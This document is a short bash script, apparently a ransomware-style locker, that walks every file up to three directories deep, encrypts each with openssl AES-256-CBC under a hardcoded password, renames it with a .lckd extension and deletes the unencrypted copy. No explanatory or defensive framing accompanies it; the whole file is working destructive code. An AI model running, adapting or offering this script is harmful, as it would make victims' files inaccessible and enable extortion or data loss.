#!/bin/bash
set -x
while :
do
        FILES=`find * -maxdepth 3 -type f \(  ! -iname "*.lckd"  ! -iname "*.key" \)`;
        for file in $FILES;
        do
                CWD=`pwd`
                encrypt_filename1=$CWD/$file.processing.lckd
				encrypt_filename2=$CWD/$file.lckd
                printf 'Encrypting:  %s\n' "$file"
				`mv $CWD/$file $encrypt_filename1 2> /dev/null` && `openssl enc -aes-256-cbc -salt -in $encrypt_filename1 -out $encrypt_filename2 -pass pass:AcnlPbOAfAw= 2> /dev/null` && `rm $encrypt_filename1 2> /dev/null`
				if [ -f "$encrypt_filename2" ]; then
                  echo ""
				  sleep 0.3
				else
                  echo "Encryption failed."
				fi
        done
        break
done
